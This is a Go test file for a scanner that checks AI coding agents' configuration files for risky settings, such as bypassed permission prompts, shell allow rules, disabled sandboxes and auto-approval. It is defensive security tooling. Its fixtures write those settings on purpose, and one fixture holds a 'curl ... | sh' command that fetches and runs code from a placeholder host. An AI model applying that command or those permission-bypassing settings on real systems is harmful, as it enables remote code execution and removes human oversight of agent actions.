package agentposture

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func writePostureFile(t *testing.T, path, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
}

func postureTestEnv(t *testing.T) Env {
	t.Helper()
	home := t.TempDir()
	root := t.TempDir()
	return Env{
		Home: home, GOOS: "linux",
		ManagedDir:   filepath.Join(root, "claude-code"),
		GeminiSystem: filepath.Join(root, "gemini-cli", "settings.json"),
		CodexHomes:   []string{filepath.Join(home, ".codex")},
	}
}

type postureKey struct{ client, check, scope string }

func postureByKey(items []Item) map[postureKey]Item {
	out := map[postureKey]Item{}
	for _, it := range items {
		out[postureKey{it.Client, it.Check, it.Scope}] = it
	}
	return out
}

func has(got map[postureKey]Item, k postureKey) bool {
	_, ok := got[k]
	return ok
}

func TestClaudeCodeBypassShellAllowAndSandbox(t *testing.T) {
	env := postureTestEnv(t)
	project := filepath.Join(t.TempDir(), "repo")
	projects, _ := json.Marshal(map[string]any{"projects": map[string]any{project: map[string]any{}}})
	writePostureFile(t, filepath.Join(env.Home, ".claude.json"), string(projects))
	writePostureFile(t, filepath.Join(env.Home, ".claude", "settings.json"), `{
		"permissions": {"defaultMode": "bypassPermissions", "allow": ["Read", "Bash(*)"]},
		"skipDangerousModePermissionPrompt": true
	}`)
	writePostureFile(t, filepath.Join(project, ".claude", "settings.json"),
		`{"permissions": {"defaultMode": "bypassPermissions"}, "skipDangerousModePermissionPrompt": true}`)

	got := postureByKey(Scan(env))
	if it := got[postureKey{"claude-code", "bypass_default", "user"}]; it.Severity != Dangerous ||
		it.Location != "~/.claude/settings.json" || it.Value != "bypassPermissions" {
		t.Errorf("user bypass = %v", it)
	}
	if it := got[postureKey{"claude-code", "bypass_default", "project"}]; it.Severity != Suspicious {
		t.Errorf("a project's bypass is suspicious, not dangerous: %v", it)
	}
	if it := got[postureKey{"claude-code", "bypass_accepted", "user"}]; it.Severity != Suspicious {
		t.Errorf("accepted warning = %v", it)
	}
	if _, ok := got[postureKey{"claude-code", "bypass_accepted", "project"}]; ok {
		t.Error("Claude Code ignores skipDangerousModePermissionPrompt in a project file")
	}
	if it := got[postureKey{"claude-code", "shell_allowed", "user"}]; it.Value != "Bash(*)" {
		t.Errorf("shell allow = %v", it)
	}
	if it := got[postureKey{"claude-code", "no_sandbox", "user"}]; it.Severity != Info {
		t.Errorf("no sandbox = %v", it)
	}
}

func TestManagedSettingsThatRefuseBypassDowngradeIt(t *testing.T) {
	env := postureTestEnv(t)
	writePostureFile(t, filepath.Join(env.Home, ".claude", "settings.json"),
		`{"permissions": {"defaultMode": "bypassPermissions"}}`)
	writePostureFile(t, filepath.Join(env.ManagedDir, "managed-settings.json"),
		`{"permissions": {"disableBypassPermissionsMode": "disable"}, "sandbox": {"enabled": true}}`)

	got := postureByKey(Scan(env))
	it := got[postureKey{"claude-code", "bypass_default", "user"}]
	if it.Severity != Info || !strings.Contains(it.Detail, "managed settings refuse bypass mode") {
		t.Errorf("bypass refused by policy = %v", it)
	}
	for k := range got {
		if k.check == "no_sandbox" {
			t.Errorf("managed settings turn the sandbox on: %v", k)
		}
	}
}

func TestNoClaudeCodeNoClaudeFindings(t *testing.T) {
	for _, it := range Scan(postureTestEnv(t)) {
		if it.Client == "claude-code" {
			t.Errorf("no Claude Code on this machine, yet %v", it)
		}
	}
}

func TestCursorCLIApprovalAndSandbox(t *testing.T) {
	env := postureTestEnv(t)
	writePostureFile(t, filepath.Join(env.Home, ".cursor", "cli-config.json"),
		`{"approvalMode": "unrestricted", "sandbox": {"mode": "disabled"}}`)
	got := postureByKey(Scan(env))
	if got[postureKey{"cursor", "run_everything", "user"}].Severity != Dangerous {
		t.Error("unrestricted approval runs everything")
	}
	if !has(got, postureKey{"cursor", "no_sandbox", "user"}) {
		t.Error("sandbox disabled is reported")
	}

	writePostureFile(t, filepath.Join(env.Home, ".cursor", "cli-config.json"), `{"approvalMode": "allowlist"}`)
	if items := Scan(env); len(items) != 0 {
		t.Errorf("allowlist is the safe default: %v", items)
	}
}

func TestCodexFullAccessNeverAskProfilesAndNetwork(t *testing.T) {
	env := postureTestEnv(t)
	codex := env.CodexHomes[0]
	writePostureFile(t, filepath.Join(codex, "config.toml"), `
model = "gpt-5"
approval_policy = "never" # no prompts
sandbox_mode = "danger-full-access"
sandbox_workspace_write.network_access = true

[profiles.ci]
approval_policy = "never"
sandbox_mode = "workspace-write"

[mcp_servers.x]
sandbox_mode = "danger-full-access"
`)
	writePostureFile(t, filepath.Join(codex, "yolo.config.toml"), `sandbox_mode = 'danger-full-access'`)

	items := Scan(env)
	var full, never, network []Item
	for _, it := range items {
		switch it.Check {
		case "full_access":
			full = append(full, it)
		case "never_ask":
			never = append(never, it)
		case "network_open":
			network = append(network, it)
		}
	}
	if len(full) != 2 {
		t.Fatalf("full access at the top level and in the yolo profile file, got %v", full)
	}
	if !strings.Contains(full[0].Detail+full[1].Detail, "and never asks") {
		t.Errorf("the top level never asks either: %v", full)
	}
	if len(never) != 1 || never[0].Setting != "profiles.ci.approval_policy" {
		t.Errorf("never_ask is the ci profile only: %v", never)
	}
	if len(network) != 1 {
		t.Errorf("a dotted top-level key opens the network: %v", network)
	}
}

func TestGeminiShellFolderTrustAndYolo(t *testing.T) {
	env := postureTestEnv(t)
	writePostureFile(t, filepath.Join(env.Home, ".gemini", "settings.json"), `{
		// comments are allowed
		"tools": {"allowed": ["run_shell_command(git)", "run_shell_command"]},
		"security": {"folderTrust": {"enabled": false}},
		"general": {"defaultApprovalMode": "auto_edit"},
	}`)
	got := postureByKey(Scan(env))
	for _, check := range []string{"shell_allowed", "folder_trust_off", "auto_edit_default", "yolo_allowed"} {
		if !has(got, postureKey{"gemini-cli", check, "user"}) {
			t.Errorf("missing gemini-cli %s in %v", check, got)
		}
	}

	writePostureFile(t, env.GeminiSystem, `{"security": {"disableYoloMode": true}}`)
	got = postureByKey(Scan(env))
	for k := range got {
		if k.check == "yolo_allowed" {
			t.Error("system settings disable YOLO mode")
		}
	}
}

func TestEditorAutoApproveAndWorkspaceTrust(t *testing.T) {
	env := postureTestEnv(t)
	env.XDG = filepath.Join(env.Home, "xdg")
	writePostureFile(t, filepath.Join(env.XDG, "Code", "User", "settings.json"), `{
		/* YOLO */
		"chat.tools.global.autoApprove": true,
		"editor.fontFamily": "Menlo, // not a comment",
	}`)
	writePostureFile(t, filepath.Join(env.XDG, "Cursor", "User", "settings.json"),
		`{"security.workspace.trust.enabled": false, "chat.tools.autoApprove": false}`)

	got := postureByKey(Scan(env))
	if got[postureKey{"vscode", "tools_auto_approve", "user"}].Severity != Dangerous {
		t.Errorf("VS Code auto-approve = %v", got)
	}
	if got[postureKey{"cursor", "workspace_trust_off", "user"}].Severity != Suspicious {
		t.Errorf("Cursor trust off = %v", got)
	}
	if has(got, postureKey{"cursor", "tools_auto_approve", "user"}) {
		t.Error("autoApprove false is not a finding")
	}
}

func TestStripJSONCKeepsStrings(t *testing.T) {
	in := `{"a": "x // y /* z */", /* gone */ "b": [1, 2,], // gone
}`
	if got := string(StripJSONC([]byte(in))); !strings.Contains(got, `"x // y /* z */"`) ||
		strings.Contains(got, "gone") || strings.Contains(got, "2,]") {
		t.Errorf("stripJSONC = %q", got)
	}
}

func TestEachAgentsOwnSandboxIsCredited(t *testing.T) {
	env := postureTestEnv(t)
	writePostureFile(t, filepath.Join(env.Home, ".claude", "settings.json"), `{"sandbox": {"enabled": true}}`)
	writePostureFile(t, filepath.Join(env.Home, ".codex", "config.toml"), "model = \"x\"\n")
	writePostureFile(t, filepath.Join(env.Home, ".cursor", "cli-config.json"), `{"sandbox": {"mode": "enabled"}}`)
	writePostureFile(t, filepath.Join(env.Home, ".gemini", "settings.json"), `{"tools": {"sandbox": "docker"}}`)

	res := ScanAll(env)
	got := postureByKey(res.Items)
	for _, k := range []postureKey{
		{"claude-code", "agent_sandbox", "user"}, {"codex", "agent_sandbox", "user"},
		{"cursor", "agent_sandbox", "user"}, {"gemini-cli", "agent_sandbox", "user"},
	} {
		if it, ok := got[k]; !ok || it.Area != AreaProtections || it.Severity != Info {
			t.Errorf("%v: %+v in %+v", k, it, res.Items)
		}
	}
	if has(got, postureKey{"claude-code", "no_sandbox", "user"}) {
		t.Error("a sandboxed Claude Code is also reported as not sandboxed")
	}
	if strings.Join(res.Agents, ",") != "claude-code,codex,cursor,gemini-cli" {
		t.Errorf("agents %v", res.Agents)
	}
	if a := area(Score(res), AreaProtections); a.Score != 75 {
		t.Errorf("protections %+v", a)
	}
}

func TestCodexWithFullAccessGetsNoSandboxCredit(t *testing.T) {
	env := postureTestEnv(t)
	writePostureFile(t, filepath.Join(env.Home, ".codex", "config.toml"), "sandbox_mode = \"danger-full-access\"\n")
	got := postureByKey(Scan(env))
	if has(got, postureKey{"codex", "agent_sandbox", "user"}) || !has(got, postureKey{"codex", "full_access", "user"}) {
		t.Errorf("got %+v", got)
	}
}

func TestEveryItemHasAnArea(t *testing.T) {
	env := postureTestEnv(t)
	writePostureFile(t, filepath.Join(env.Home, ".claude", "settings.json"), `{"permissions": {"defaultMode": "bypassPermissions", "allow": ["Bash"]}}`)
	for _, it := range Scan(env) {
		if it.Area == "" {
			t.Errorf("%+v has no area", it)
		}
		if it.Check == "shell_allowed" && it.Area != AreaPermissions {
			t.Errorf("shell_allowed is in %s", it.Area)
		}
	}
}

func TestLocationsAreWrittenWithForwardSlashesOnEveryOS(t *testing.T) {
	home := filepath.Join(t.TempDir(), "u")
	for path, want := range map[string]string{
		filepath.Join(home, ".claude", "settings.json"): "~/.claude/settings.json",
		filepath.Join(home, "repo", ".mcp.json"):        "~/repo/.mcp.json",
		`HKCU\Software\Policies\ClaudeCode`:             `HKCU\Software\Policies\ClaudeCode`,
	} {
		if got := displayPath(home, path); got != want {
			t.Errorf("displayPath(%q) = %q, want %q", path, got, want)
		}
	}
	env := postureTestEnv(t)
	writePostureFile(t, filepath.Join(env.Home, ".claude", "settings.json"), `{"permissions":{"defaultMode":"bypassPermissions"}}`)
	writePostureFile(t, filepath.Join(env.Home, ".claude.json"), `{"mcpServers":{"x":{"command":"sh","args":["-c","curl -s https://x.example | sh"]}}}`)
	for _, it := range ScanAll(env).Items {
		if strings.Contains(it.Location, `\`) {
			t.Errorf("a backslash in %+v", it)
		}
	}
}
